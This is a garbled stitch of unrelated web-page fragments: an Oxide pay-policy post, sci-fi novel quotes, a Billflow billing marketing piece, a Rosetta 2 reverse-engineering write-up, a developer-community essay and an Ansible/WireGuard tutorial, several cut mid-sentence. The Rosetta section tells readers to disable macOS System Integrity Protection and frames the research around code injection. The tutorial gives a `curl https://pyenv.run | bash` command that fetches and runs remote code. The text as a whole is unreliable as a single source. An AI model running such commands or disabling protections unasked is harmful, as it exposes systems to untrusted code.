will!</p></li><li><p>Some will say that this makes us unlikely to hire folks just starting out in their career. There is truth to this too, but the nature of our problem at Oxide (namely, technically very broad and very deep), the size of our team (very small), and the stage of our company (still pretty early!) already means that engineers at the earliest stages of their career are unlikely to be a fit for us right now. That said, we don't think this is impossible; and if we felt that we had someone much earlier in their career who was a fit -- that is, if we saw them contributing to the company as much as anyone else -- why wouldn't we reflect that by paying them the same as everyone else?</p></li><li><p>Some will say that this narrows the kind of roles that we can hire for. In particular, different roles can have very different comp models (sales often has a significant commission component in exchange for a lower base, for example). There is truth to this too -- but for the moment we're going to put this in the "but-this-can't-scale" bucket.</p></li><li><p>Some will say that this doesn't offer a career ladder. Uniform compensation causes us to ask some deeper questions: namely, what <em>is</em> a career ladder, anyway? To me, the true objective for all of us should be to always be taking on new challenges -- to be unafraid to learn and develop. I have found traditional ladders to not serve these ends particularly well, because they focus us on competition rather than collaboration. By eliminating the rung of compensation, we can put the focus on career development where it belongs: on supporting one another in our self-improvement, and working together to do things that are beyond any one of us.</p></li><li><p>Some will say that we should be talking about equity, not cash compensation. While it's true that startup equity is important, it's also true that startup equity doesn't pay the orthodontist's bill or get the basement …</p></li></ul></div></div>

Instead, we’d burned our home.”</p><p>“…a true utopia would have a one hundred percent suicide rate, where everyone dies precisely when and how they wish.”</p><p>“Theoretically the only tool you really needed to survive was a gun; everything else could be taken from others who lacked one.”</p><p>“Tragically ironic, isn’t it? How nuclear weapons represent both our species’ mastery over the very foundations of nature, as well as our utter inability to master our most primitive instincts.”</p><p>“Would intelligent life evolve again on this planet, and if so would it have the means — like opposable thumbs or a way to store knowledge outside of brains — to build technology? Dolphins could have lived for eternity and never developed the capability to annihilate their species or the world, much less colonize another.”</p><p>“We stood on the shoulders of giants, but we fell off.”</p><p>“There were many slippery slopes to nihilism in this new world, and the higher up you were the easier it was to fall down one of them.”</p><p><strong>(Dark) Humor</strong></p><p>“So, this is how the world ends, eh? Not with a bang, not with a whimper, but with a disgusting gurgling sound, he thought.”</p><p>“Chad was a twenty-six-year-old former developer of software used to develop more advanced software. He was now unemployed.”</p><p>“The story of Noah’s Ark, if you’re familiar, left out the part where the animal kingdom is repopulated entirely through rampant incest.”</p><p>“A fate worse than death, in that it also included death at the end.”</p><p>“Like no small number of wealthy people he’d taken up an antiquated form of transportation as a hobby.”</p><p>“The lights went down in the city, an artificial sun shining on the bay.”</p><p><strong>About Life</strong></p><p>“He’d been younger then, when sex meant both nothing and everything.”</p><p>“I used to wish I’d have nightmares — what a pleasure it would have been to wake up. If all your dreams are terrifying, reality actually becomes something to look forward to.”</p><p>“…life is a war we all lose in the end, but every day is a battle, and you can sure as hell win some of those.”</p><p>“But the surest way to live a worthwhile, meaningful life was to have already done so, those moments etched forever into the fabric of spacetime.”</p><p>“A not-so-subtle reminder that anyone can lose everything at any time, though few think it will happen to them and none get the chance to realize it did when it does.”</p><p>“How spectacularly things shine when viewed from the darkness…”</p><p><strong>About the Mind</strong></p><p>“…how can someone who may be losing his mind accurately assess his own sanity?”</p><p>“There’s nothing quite so terrifying as being unsure of your own sanity. All other concerns are downstream.”</p><p>“Once upon a time the only thing that couldn’t be taken from someone under any circumstances was their own attitude and thoughts. A sufficiently trained and powerful mind could always take refuge in itself. But Keli knew all too well this was no longer the case; when you strip away the layers of abstraction we’re merely chemical reactions and electric pulses, both of which can be manipulated.”</p><p>“But at this point I know I’m only remembering the last time I remembered, an increasingly distorted recursion reaching back in time.”</p><p><strong>About the Universe</strong></p><p>“With a fixed amount of matter and energy in the universe, everything is a zero-sum game on some level.”</p><p>“The electrified gas creating these vibrant displays was a distinct and oft-forgotten fourth phase of matter — plasma — that comprised more of the universe than all but matter’s fifth phase: dark.”</p><p>“There’s a brute fact at the end of every chain of causality. Some are just harder to accept than others. If you keep asking ‘why’ in any domain you eventually arrive at something that just seems to be true about reality, at least insofar as we understand it.”</p><p><em>If you like these quotes and are interested in a full book about these themes, my debut sci-fi novel </em>Mind Painter <em>is available on </em><a href="https://www.amazon.com/Mind-Painter-Tom-B-Night/dp/B08NDVJ3C8/" target="_blank"><em>Amazon</em></a><em>.</em></p></div></div></div></div></div></div></div>]]>

            <section>
                <div>
                    <p>It starts with a simple use case. You want to charge customers every month for getting access to your SaaS. Customers must be able to pick a plan, upgrade, update their card info, download invoices, and cancel the subscription. For a team with technical resources and no prior experience with billing and payments, this use case may seem like a fun project to build internally. For veteran founders and product leads, it is the tip of a giant iceberg of SaaS billing.</p><p>In this guide, we'll discuss the unforeseen risks of building an in-house SaaS billing integration.</p><h2 id="build-vs-buy-debatable-components">Build vs. buy debatable components</h2><p>SaaS billing is a complex, multi-layered beast. To better understand the debate on building versus buying a billing solution, it's best to look at each SaaS billing component.</p><figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/ah57r6c/2021/03/Build-Vs.-Buy--1-.png" alt=""><figcaption>SaaS billing build vs. buy decision point</figcaption></figure><p>The core layers, including payments, subscription billing, and analytics, have evolved solutions that make the buy argument an easy win. Product teams don't reinvent tools like <a href="http://stripe.com/payments?ref=billflow">Stripe Payments</a> and <a href="https://stripe.com/billing?ref=billflow">Stripe Billing</a> for handling the logistics of payments and subscriptions. Analytical tools such as <a href="https://chartmogul.com/?ref=billflow">ChartMogul</a>, <a href="https://baremetrics.com/?ref=billflow">Baremetrics</a>, and <a href="http://profitwell.com/?ref=billflow">ProfitWell</a> make it very easy to plug and play with data.</p><p>The component that is usually up for debate by the product teams is the SaaS billing user interface and experience (UI/UX). Billing UI/UX consists of all the customer-facing billing logic the end-user interacts with inside your app. Think of it as the front-end of your billing. Unlike the rest, the billing UI component has fewer solutions, developers are less solution-aware, and it looks deceivingly simpler to build at first glance.</p><p>When SaaS companies are deciding on building vs. buying the billing UI, they focus most of their energy on finding the risks rather than the values they get from buying. <a href="https://twitter.com/Lethain">Will Larson</a>, CTO of <a href="https://www.calm.com/?ref=billflow">Calm</a>, explains this well in his <a href="https://lethain.com/build-vs-buy/?ref=billflow">Build versus buy masterpiece</a>:</p><!--kg-card-begin: markdown--><blockquote>
<p>"In the build versus buy decision, most companies put the majority of their energy into identifying risk, which has its place, but often culminates in a robust <a href="https://en.wikipedia.org/wiki/Not_invented_here">not invented here</a> culture that robs the core business of attention. To avoid that fate, it's important to spend at least as much time on the value that comes from buy decisions."</p>
</blockquote>
<!--kg-card-end: markdown--><h2 id="risks-values">Risks &amp; values</h2><p>The billing user interface is a very integral part of your billing flow. It is the bridge between billing and the customer acquisition strategy. In a survey of 136 SMB SaaS companies by <a href="https://www.billflow.io/">Billflow</a>, the top three factors companies looked for in a new billing UI solution were ease of set up, customizability, and reliability.</p><figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/ah57r6c/2021/03/Screen-Shot-2021-03-02-at-12.39.09-PM.png" alt=""><figcaption>Survey of 136 SaaS businesses by Billflow</figcaption></figure><p>Rightfully so, development teams seek customizability, compatibility, and control over any internal or external tool they integrate with. Suppose there is a well-known solution that checks these boxes. In that case, the decision becomes simple, but when the status quo is building an in-house solution, it is the product leader's job to seek options to save time and resources. In the end, there should be a very compelling reason to build versus buying. <a href="https://www.cfodive.com/news/saas-billing-system-development/582545?ref=billflow">CFOdive</a> sums it well:</p><!--kg-card-begin: markdown--><blockquote>
<p>"A system that grows as your services and pricing become more complex will be far costlier and take longer than you expect."</p>
</blockquote>
<!--kg-card-end: markdown--><p>Luckily, we've done our research. Here are the value comparisons of buying a SaaS billing UI versus building one in-house.</p><h3 id="initial-implementation-time">Initial implementation time</h3><figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/ah57r6c/2021/03/---1-.png" alt=""><figcaption>SaaS billing in-house integration cost vs. buying Billflow</figcaption></figure><p>Building an in-house billing integration requires a learning curve for the development team. We've spoken to over 500 SMB SaaS startups. The time it takes to implement billing into an app varies primarily based on the pricing model and the user acquisition strategy (freemium, free trial, etc.). Businesses in this segment spend an average of eight weeks to architect, implement, and test their initial SaaS billing integration. Calculating the in-house resource consumption, SaaS startups spend an average of $25,000 on building their initial version of SaaS billing. Buying an out-of-the-box solution can reduce the timeline to less than a week with a fraction of the cost!</p><h3 id="on-going-maintenance-support">On-going maintenance &amp; support</h3><p>Maintaining an in-house billing integration is time-consuming. There are unaccounted factors that will require development work as you scale your business and pricing model. Here are some common ones:</p><ul><li>You may need to update your billing flow. For example, moving from flat subscriptions to the usage-based model, introducing add-ons to upsell features, adding churn surveys to increase retention, or moving from free trials to freemium.</li><li>Features such as language support, currency localization, taxes &amp; VATs, and payment method support will inevitably come up as you scale.</li><li>You may want to update pricing or run promotional experiments.</li><li>You may need to change billing-related marketing copy to improve conversion.</li><li>Global policies could change. For example, EU requiring SCA.</li></ul><p>Buying a solution will give your developers instant access to billing features, updates, and, most importantly, billing experts who can save your development team a ton of time. Tools like <a href="https://www.billflow.io/">Billflow</a> work on top of <a href="https://stripe.com/billing">Stripe Billing</a> with Stripe's best practices for SaaS integration.</p><h3 id="product-focus">Product focus</h3><p>Time is precious, and focus is nontrivial. Focusing on the core product and not being distracted by building and maintaining internal tools is essential. Billing spans to more than just the development team. Finance and marketing teams often ask for aesthetic or pricing changes that will require billing changes. With an in-house integration, a simple verbiage change will require developers' time. Reducing the building and maintenance of non-product-related code will significantly impact the hours your development team spends on the product itself.</p><p>SaaS companies don't build an internal video conferencing tool, email, docs system, or messaging tool. As long as the tool is not part of the core product and vision, it is much more cost-effective to pay for it rather than building your own. The same goes for billing. Don't let the recurring cost and developer's love for building internal tools hold you back from focusing on your vision. If the price is higher than your budget, communicate transparently with the vendors, new markets are more forgiving with cost as they need adaption and feedback in the early days.</p><p>Nowadays, there is a range of low-code and no-code tools available to reduce the friction of building a scalable SaaS product. They maintain the code, so your developers don't have to. A great example of a no-code/low-code billing solution is <a href="https://stripe.com/billing?ref=billflow">Stripe Billing</a> and <a href="https://www.billflow.io/">Billflow</a> no-code billing toolkit.</p><figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/ah57r6c/2021/03/Stack.png" alt=""><figcaption>Stripe Billing + Billflow</figcaption></figure><p>If you are looking for a Stripe Billing expert advice on your billing architecture, you can <a href="https://calendly.com/darafsheh/consultation">schedule a 30-minute call with me here</a>.</p>

<h2 id="introduction">Introduction</h2>
<p>Apple announced that it would be moving from Intel processors to Arm-based Apple Silicon CPUs for Macs at WWDC 2020.
The Apple Silicon-based Mac Book Air and Pro were released in October 2020 with great fanfare.</p>
<p>One of the issues that arise with the CPU transition is application compatibility.
Since Apple Silicon is an Arm-based processor, applications built for Intel-based Macs will no longer work.
To solve this problem, Apple offers the following two technologies:</p>
<ul>
<li>Universal Binary 2</li>
<li>Rosetta 2</li>
</ul>
<p>Universal Binary 2 is a mechanism to encapsulate binaries built for multiple architectures into a single binary, which is also called Fat Binary.
Apple has been using this technology for a long time to maintain backward compatibility.
A Mach-O loader selects the binary with the best architecture for the machine it is running on, then loads only that binary into memory to run the program.
Most macOS Big Sur system binaries are currently Fat Binaries, containing binaries built for both Arm and Intel architectures.</p>
<p>Rosetta 2 is a technology that translates Intel-based binaries or JIT-generated code into Arm-based binaries or code.
It is the successor to Rosetta, which was also used in the past processor transition.
There is not much information officially released by Apple.
Of course, there is no source code available, unlike the XNU kernel.
Also, at the time of writing this article, there seems to be no article that examines it in detail.</p>
<p>In this article, I introduce some reverse engineering results of Rosetta 2.</p>
<p>Why I take a closer look at Rosetta 2?</p>
<p>The reason is that I'm interested in translated binaries in Rosetta 2 and examining the possibility of exploiting them.
I presented <a href="https://www.blackhat.com/eu-20/briefings/schedule/index.html#jack-in-the-cache-a-new-code-injection-technique-through-modifying-x-to-arm-translation-cache-21324">a new code injection technique in Windows 10 on Arm at Black Hat EU</a> last December.
The code injection is achieved by modifying x86 to Arm (XTA) binary translation cache files.
This research encourages me to examine whether similar code injection techniques can be achieved with Rosetta 2.</p>
<p>In this part, I will cover the following points:</p>
<ul>
<li>The executables associated with Rosetta 2 and their roles</li>
<li>Analysis results of the translated binaries</li>
<li>JIT binary translation capabilities of Rosetta 2 (mainly focusing on x86_64 machine code decoding process)</li>
</ul>
<p>In the following, I will follow Apple's terminology when referring to architecture.</p>
<ul>
<li>arm64: The architecture specified when generating binaries to run on an Apple Silicon Mac</li>
<li>x86_64: The architecture specified when generating binaries to run on an Intel-based Mac</li>
</ul>
<h2 id="setting-up-the-analysis-environment">Setting up the analysis environment</h2>
<p>First, I show you how to set up the analysis environment.</p>
<p>Rosetta 2 is not installed by default on an Apple Silicon Mac.
So, you need to install it following the pop-up that appears when you run an x86_64 code for the first time.</p>
<figure>

    <figcaption>Figure 1 Rosetta 2 installation popup (https://support.apple.com/en-us/HT211861).</figcaption>
</figure>

<p>After the installation, a folder named <code>/Library/Apple/usr/libexec/oah/</code> (hereinafter referred to as the oah folder) is created, and you can see the following binaries installed.</p>
<figure>
    <img src="https://ffri.github.io/ProjectChampollion/assets/rosetta_binaries.png">
    <figcaption>Figure 2 Binaries installed after Rosetta 2 installation.</figcaption>
</figure>

<p>The role of each binary will be explained later.</p>
<p>The next step is to disable System Integrity Protection (SIP).
This is because the folder that contains the translated binaries is protected by SIP and cannot be accessed by default even with administrative privileges.</p>
<p>Please follow the steps below to disable SIP.</p>
<ul>
<li>Restart the OS</li>
<li>Press and hold Touch ID to boot in the recovery mode</li>
<li>Select Terminal from "Utilities" at the top of the screen</li>
<li>Type <code>csrutil disable</code> and execute</li>
<li>Restart the OS again</li>
</ul>
<p>In addition to this, please install Xcode and Command Line Tools for Xcode to use Clang and LLDB.</p>
<h2 id="roles-of-oahd-and-oahd-helper">Roles of <code>oahd</code> and <code>oahd-helper</code></h2>
<p>First, let's create a command line application built for x86_64 and monitor system events (e.g., process creation, file-system activities, and memory mapping) when the x86_64 application runs.</p>
<pre><code>$ cat hello.c
#include &lt;stdio.h&gt;
int main() {
    puts("Hello World");
    return 0;
}
$ clang -arch x86_64 hello.c -o hello.out # specify x86_64 as the target architecture
$ file hello.out
hello.out: Mach-O 64-bit executable x86_64
</code></pre>
<p>To obtain several system events, I used EventMonitor created using the <a href="https://developer.apple.com/documentation/endpointsecurity">Endpoint Security Framework</a>.
I will release EventMonitor as an OSS soon.</p>
<p>Start EventMonitor and run <code>hello.out</code>.
The following jsonl file contains logs obtained by EventMonitor. The only events related to Rosetta 2 are extracted.</p>
<p><a href="https://ffri.github.io/ProjectChampollion/assets/event.jsonl">event.jsonl</a></p>
<p>When you look at the first line of the logs, you can see an event where <code>/bin/zsh</code> executes <code>hello.out</code>.</p>
<pre><code>{"event":{"log":{"args":[".\/hello.out"],"cwd":{"path":"\/Users\/konakagawa.ffri","path_truncated":false},"last_fd":4,"target":{"executable_path":"\/Users\/konakagawa.ffri\/hello.out","group_id":54132,"pid":54132,"ppid":48492,"session_id":48491}},"type":"exec"},"target_process":{"executable_path":"\/bin\/zsh","group_id":54132,"pid":54132,"ppid":48492,"session_id":48491}}
</code></pre>
<p>After the exec system call, <code>oahd</code> daemon checks for the file <code>/var/db/oah/16c6785d8fdab5ee2435f23dc2962ceda2e76042ea2ad1517687c5bb7358bf00/065b3f057e68a5474d378306e41d8b1e3e8e612b9cf9010b76449e02b607d7f0/hello.out.aot</code>.</p>
<pre><code>... (the oahd checks for the AOT file)
{"event":{"log":{"relative_target":"var\/db\/oah\/16c6785d8fdab5ee2435f23dc2962ceda2e76042ea2ad1517687c5bb7358bf00\/065b3f057e68a5474d378306e41d8b1e3e8e612b9cf9010b76449e02b607d7f0\/hello.out.aot","source_dir":{"path":"\/","path_truncated":false}},"type":"lookup"},"target_process":{"executable_path":"\/Library\/Apple\/usr\/libexec\/oah\/oahd","group_id":426,"pid":426,"ppid":1,"session_id":426}}
</code></pre>
<p>The file with the extension <code>.aot</code> contains the result of the translation from x86_64 to arm64.
We refer to this file as the AOT file.
The name <code>.aot</code> comes from Ahead-Of-Time, which means that the translation is performed before a thread actually starts.
The <code>oahd</code> is the management daemon for the AOT files.</p>
<p>Since this is the first time we run <code>hello.out</code>, the <code>oahd</code> cannot find the corresponding AOT file. So, it creates a new AOT file.
If the same binary in the same path has already been executed and the AOT file has been created, the <code>oahd</code> uses it.</p>
<p>You can see the folder named <code>/var/db/oah</code> in the above logs.
This folder has a <code>Oah.version</code> file at the top, which is supposed to contain the version information for Rosetta 2.
Also, this folder has <code>16c6785d8fdab5ee2435f23dc2962ceda2e76042ea2ad1517687c5bb7358bf00</code> folder.
We can see that multiple folders are containing AOT files in it.
The names of these folders are SHA-256 hash values that are calculated from both the contents of the file in x86_64 code and the path where it was executed.</p>
<pre><code># /var/db/oah contains the Oah.version file and 16c6785d8fdab5ee2435f23dc2962ceda2e76042ea2ad1517687c5bb7358bf00 folder

<p>There's a big shift going on in how developer tools companies approach their userbase. In the past week alone, I've had 3 chats with startups that all concluded with some version of:</p>
<blockquote>
  <p>"By the way, we're really looking to ramp up our community effort right now. If you can think of anyone who can help us build a developer community, can you send them my way?"</p>
</blockquote>
<p>One week, three pings. If this isn't a big trend already, it's at least worth writing about (per <a href="https://www.swyx.io/three-strikes/">my Three Strikes rule</a>). <strong>Who builds developer communities, why are companies investing in them, and <em>why now</em>?</strong></p>
<p>

</p>
<section>
  <h2 id="whos-job-is-it-anyway"><a href="#whos-job-is-it-anyway">Who's Job Is It Anyway?</a></h2>
  <p>Developers have had a long history of spontaneous community formation dating back to the IRC and BBSes of yore. (<em>Misery loves company?</em>) There is still a strong ethos of self organized community in modern dev culture, but the vast majority of this lies on the shoulders of a small group of under-funded volunteers.</p>
  <p>But in the last couple decades, company-centric communities, where <strong>the community is almost the entire competitive moat</strong> of the company, have become a central part of developer life:</p>
  <ul>
    <li><strong>StackOverflow</strong> serves <a href="https://stackexchange.com/sites?view=list#traffic">11m visits a day</a> with community contributed Q&amp;A's and sells ads and knowledge base software on the side.</li>
    <li><strong>GitHub</strong> builds developer collaboration software, but at its core is a <a href="https://octoverse.github.com/">56m-developer</a> social network atop Git.</li>
    <li><strong>Hacker News</strong> (serving at least <a href="https://news.ycombinator.com/item?id=16076041">4m a day</a>) is a big part of Y Combinator's unfair advantage in getting both founder mindshare and hiring talent.</li>
  </ul>
  <p>You would expect that this realization would spawn a dedicated discipline to prioritize it, in the same way that <a href="http://www.paulgraham.com/growth.html">Startups = Growth</a> justifies the need for a <a href="https://andrewchen.co/how-to-be-a-growth-hacker-an-airbnbcraigslist-case-study/">Growth Hacker</a> at every company serious about growth.</p>
  <p>But as far as I can tell, it hasn't happened.</p>
  <p>Sure, companies do hire community managers to groom their forums and post inoffensive memes (<em>j/k of course, good community managers do much more than this</em>). Some developer advocates may focus on community, but most developer evangelists create content and do outreach to other communities, to "meet developers where they are". Marketing folks might run the company mailing list, host webinars, or organize conferences, all mini-communities in their own right. Everyone intuitively gets the importance of community, and does their best within given boundaries.</p>
  <p>But who's job is it to define the overall community strategy, and has the resources to develop it as aggressively as engineering? If this describes someone in your management team, great. But often the community builders are at the bottom of the totem pole.</p>
  <p>The Venn diagram of people who can scale code and people who can scale community is going to be <a href="https://www.heavybit.com/library/podcasts/jamstack-radio/ep-51-community-over-code-with-shawn-wang-of-netlify/">exceedingly valuable</a>. You don't strictly <strong>need</strong> to be technical to run community — Ben Popper, StackOverflow's Director of Content, is <a href="https://stackoverflow.blog/2019/10/22/ben-popper-is-the-worst-coder-in-the-world/">still new to code</a> — but developers can tell when they aren't talking to a technical person and that limits the depth of conversation. A technical community builder will have instincts informed by direct personal experience, and be able to empathize with member needs and make targeted recommendations.</p>
  <p>The job title probably won't stay "community builder", by the way. <a href="https://twitter.com/patio11/status/1299217439671025665?s=20">Patrick McKenzie once observed</a> that the DevOps movement led to "a once-in-a-lifetime upgrade in status, impact, authority, and career prospect" for sysadmins. I think a similar rebrand is due. As community goes from a side activity to a core driver of product, support, and marketing (<a href="https://blog.usejournal.com/the-rise-of-the-community-department-232d427de65f">great thoughts from Lisa Xu on this</a>), the status and pay change will need a new name for people to rally behind.</p>
  <p>What shall we call it? "Community <a href="https://dangerouslyawesome.com/2014/04/community-management-tummling-a-tale-of-two-mindsets/">Tummler</a>"? "Community Developer"? Let me know if you have a better name. I've settled on "Technical Community Builder" for now, in the same way that Microsoft and Amazon have Technical Product Managers.</p>
</section>
<section>
  
  <p>TL;DR: <strong>Traditional marketing and support isn't cutting it</strong>.</p>
  <p>Devtools companies get that "build it and they will come" usually doesn't work. The sub-industries of technical marketing and developer relations are well developed enough now that there are <a href="https://learn.samjulien.com/getting-started-in-developer-relations">books</a> and <a href="https://www.devrelcon.net/">conferences</a> about it. We get that marketing can be just as important as product. (<em>Let's leave the topic of "how much devrel and marketing overlap" for a future post...</em>)</p>
  <p>But a buyer's journey can start long before — and continue long after — their first contact and passage through the marketing funnel:</p>
  <ul>
    <li>Marketing attribution in developer tools is kayfabe — we play at tracking Twitter clickthroughs and podcast direct response, but everyone in marketing knows you need at least <a href="https://www.socialmediatoday.com/content/seven-touches-basic-marketing-principle-action">7-13 touches</a> before someone really considers you. As a developer I often wait out <em>an entire year</em> after hearing about something before even trying it out, just to see if it has staying power.</li>
    <li>After buying into a solution, I still need help to be successful with the tool. Developer tools are ultimately creative tools, and sometimes the imagination needs a little inspiration. Setup hurdles need to be overcome. If I buy something and end up not using it, it's going into the do-not-use pile for a very, very long time before I ever give it another shot.</li>
  </ul>
  <p>This adoption process needs to turn from a mostly-transactional, finite game, to a relationship-based infinite game. You might envision Community as carefully designing the broader environment around the traditional sales and marketing funnel:</p>
  <p>
    <img src="https://user-images.githubusercontent.com/6764957/109989150-31fee000-7d43-11eb-9818-59daf4797147.png" alt="Developer Journey">
  </p>
  <p>Or you could <strong>reject the funnel</strong> altogether. To quote <a href="https://twitter.com/patrickjwoods/">Patrick Woods</a>:</p>
  <blockquote>
    <p>"Characterizing the developer journey as a linear funnel doesn’t really tell the whole story, as it’s essentially scoped to awareness and conversation — the journey is much more complex. I think onboarding to the community itself, retaining over time, and advocating for others to join, is a huge part of the journey... In this world, you want to understand how folks are engaging with the community <em>as well as</em> with the company/product, with product metrics (activation, adoption, etc) existing as second-order effects of the community. <a href="https://github.com/orbit-love/orbit-model">The Orbit Model</a>, versus the funnel, tries to tell this nonlinear and comprehensive story."</p>
  </blockquote>
  <p>When most developers make technical choices, you are just as likely to hear them praise the strength of the "ecosystem" (aka a community, with thriving third parties) as they do the core technical merits. In terms of <a href="https://twitter.com/swyx/status/1360882870638665731">the Rogers curve</a>, this is the kind of argument made by "mainstream" developers:</p>
  <p>
    <img src="https://user-images.githubusercontent.com/6764957/109990452-5e672c00-7d44-11eb-8a0b-159491db2d6b.png" alt="Community crossing the chasm">
  </p>
  <p><strong>Community is how developer tools cross the chasm</strong> from early adopters to the majority. Every devtools company looking to scale eventually has to figure this out, whether consciously or otherwise.</p>
  <p>Other arguments in bullet point form, but feel free to request elaborations:</p>
  <ul>
    <li>
      <p><strong>Retention</strong>: Build product and they may not come, but <strong>build community and they will stay.</strong></p>
    </li>
    <li>
      <p><strong>Hiring</strong>: Community can just as easily net you employees as it does users and customers.</p>
    </li>
    <li>
      <p><strong>Marketing</strong>: Community is highest-signal social proof/word of mouth you <strong>cannot</strong> buy.</p>
    </li>
    <li>
      <p><strong>Moat</strong>: Community is a "feature" that cannot be copied. By Hamilton Helmer's 7 Powers Framework (<em><a href="https://www.sachinrekhi.com/7-powers-hamilton-helmer">the strategy framework du jour</a></em>), Community helps you gain Network Economies, increase Switching Costs and Corner one of the most precious resources on Earth: Developers!.</p>
    </li>
    <li>
      <p><strong>Scaling</strong>: Community is many-to-many, where Marketing/Devrel is one-to-many. The value of a community-focused user base scales by Metcalfe's law instead of Sarnoff's law. A thriving third-party <em>ecosystem</em> scales by Reed's law — even better!</p>
      <p>
        <img src="https://user-images.githubusercontent.com/6764957/109877251-bd2d9680-7cad-11eb-8a18-4b4330745d6c.png" alt="Reed's law">
      </p>
    </li>
    <li>
      <p><strong>Risks</strong>: But you also do not "own" your community - the best you can do is lead by example, encourage helpful behavior, and enforce clear codes of conduct. Community is "user-generated content", and that bears with it great responsibility. Poor handling can <a href="https://www.fastcompany.com/90401254/ea-gets-a-guinness-world-record-for-the-most-downvoted-comment-in-reddit-history">backfire horrifically</a>.</p>
    </li>
    <li>
      <p><strong>Free Work?</strong> Community members can answer questions to each other and develop integrations to help you grow beyond your limited resources. To avoid expecting members to "do free work", this effort must be reciprocated by careful stewardship.</p>
    </li>
    <li>
      <p><strong>Lifespan</strong>: One of the best measures of community success is when your users' relationship with you outlasts their current employment. <strong><a href="https://hunterwalk.medium.com/coming-for-the-content-staying-for-the-community-started-with-video-games-or-maybe-religion-5083f3773a2">Come for the software, stay for the community</a></strong>. Help your users get jobs, help your customers hire your users, and you will have fans for life.</p>
    </li>
    <li>
      <p><strong>Open Source</strong>: Commercial Open Source companies must foster a viable community to be successful open source, rather than being de-facto "source available". In <a href="https://www.thepullrequest.com/p/nadia-eghbal">Nadia Eghbal's terms</a>, more Federations than Stadiums, but both are definitely preferable over Clubs and Toys.</p>
    </li>
    <li>
      <p><strong>Product Insights</strong>: Speaking to users helps you build things people want, but often these conversations are done by outreach (user survey or feedback session) rather than observation (<em>in situ,</em> natural environment). Community is where your deepest and most authentic user insights will originate.</p>
    </li>

  <p>All in all — <strong>a devtools company that prioritizes an engaged and inclusive developer community will run circles around one that doesn't.</strong></p>
  <p>There are multiple ways to do this well, but I am particularly fond of community that "serves a bigger purpose". A community that is strictly centered around a company (eg Dreamforce → Salesforce) is less appealing than one with room for multiple players (eg No Code → Webflow, Jamstack → Netlify), at least while you aren't yet a decacorn. Every great community is a great marketplace (<em>tbc in a future post...</em>), and every marketplace is a kind of platform, and every platform must respect <a href="https://twitter.com/swyx/status/1360729115372920832">the Bill Gates Line</a> with its participants.</p>

March 4, 2021 | https://www.tangramvision.com/blog/exploring-ansible-via-setting-up-a-wireguard-vpn | <a href="https://web.archive.org/web/*/https://www.tangramvision.com/blog/exploring-ansible-via-setting-up-a-wireguard-vpn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In my [previous blogpost](https://www.tangramvision.com/blog/what-they-dont-tell-you-about-setting-up-a-wireguard-vpn), we set up a WireGuard VPN server and client and learned about various configuration options for WireGuard, how to improve VPN server uptime, how to relay traffic, and more. Setting up a server and client like that is a lot of work! If the server dies or you want to set up a new server (maybe for a friend or family member this time), you have to go back to the walk-through and follow all the steps, remembering if you deviated from those instructions at any point.</p><p>There's a better way — automation! If you're only going to do a thing once (e.g. set up a VPN), investing in automation probably doesn't make sense. But if you anticipate doing a thing repeatedly, automating it frees up your time to learn and accomplish more in the future. You can also share your automation, empowering others to build and achieve more, faster.</p><p>Automation is the heart of computing, and many different automation tools and approaches have sprung up over time. For our project of automating VPN server setup, we can consider a variety of tools:</p><p>- Shell scripts<br> &nbsp; &nbsp;- The simplest approach from a tooling perspective, writing shell scripts would involve running the commands from the [previous WireGuard tutorial blogpost](https://www.tangramvision.com/blog/what-they-dont-tell-you-about-setting-up-a-wireguard-vpn), using `ssh` for the commands that run on the server and `rsync` to copy configurations files to the server.<br>- SSH scripting libraries like [Capistrano](https://capistranorb.com/documentation/overview/what-is-capistrano/) or [Fabric](http://www.fabfile.org/)<br> &nbsp; &nbsp;- If shell scripting isn't ideal, there are libraries that expose similar scripting functionality in a more ergonomic interface for developers familiar with higher-level languages like Ruby and Python.<br>- Infrastructure/configuration automation tools like [Puppet](https://puppet.com/), [Chef](https://www.chef.io/), or [Ansible](https://www.ansible.com/)<br> &nbsp; &nbsp;- Tools in this category are even more specialized for automating server infrastructure and configuration, often including an ecosystem of packages and plugins to automatically set up or configure nearly anything you can think of.<br>- Infrastructure-as-code tools like [Terraform](https://www.terraform.io/)<br> &nbsp; &nbsp;- Infrastructure-as-code (IaC) tools have a lot of overlap with the above category, but support provisioning cloud resources in a more first-class/native way.<br>- Containers like [Docker](https://www.docker.com/)<br> &nbsp; &nbsp;- You could also run WireGuard in containers, deploying a server-configured container image to a cloud provider and running a client-configured container image locally to connect to the server. There are [a few](https://medium.com/@firizki/running-wireguard-on-docker-container-76355c43787c) [existing](https://hub.docker.com/r/linuxserver/wireguard) [examples](https://blog.jessfraz.com/post/installing-and-using-wireguard/) of this approach.</p><p>For this tutorial, I'm going to focus on the middle category above — infrastructure/configuration automation tools — and specifically, I'll focus on Ansible. There is a [great comparison of different tools in this area](https://blog.gruntwork.io/why-we-use-terraform-and-not-chef-puppet-ansible-saltstack-or-cloudformation-7989dad2865c) by Gruntwork and, even though that article favors Terraform, Ansible is still a useful general-purpose tool, especially if you're working with servers that aren't "in the cloud", such as a Raspberry Pi at home.</p><p>Let's get started with automating VPN setup with Ansible! By the end of this article, we'll be able to set up a VPN server and client with a single command. Similar to the previous blogpost, I'll use Ubuntu 20.04 and DigitalOcean droplets.</p><p># Setting up Ansible</p><p>Ansible can be [installed via an OS package manager](https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html) like `apt`, but I prefer to use `pip` so I can get the latest updates and avoid cluttering system package management with third-party PPAs (Personal Package Archives). We'll also use `pyenv` (as suggested by [Hypermodern Python](https://medium.com/@cjolowicz/hypermodern-python-d44485d9d769#6e8a)) to make sure we're not breaking or cluttering the system Python installation. Install `pyenv` with the following:</p><p>```bash<br># From https://github.com/pyenv/pyenv/wiki#suggested-build-environment<br>sudo apt-get update</p><p>sudo apt-get install --no-install-recommends make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev</p><p>curl https://pyenv.run | bash<br>```</p><p>It's a good habit when a tutorial gives you `curl &lt;url&gt; | bash` to open up that URL and see what it's going to do. In this case, you'll see that 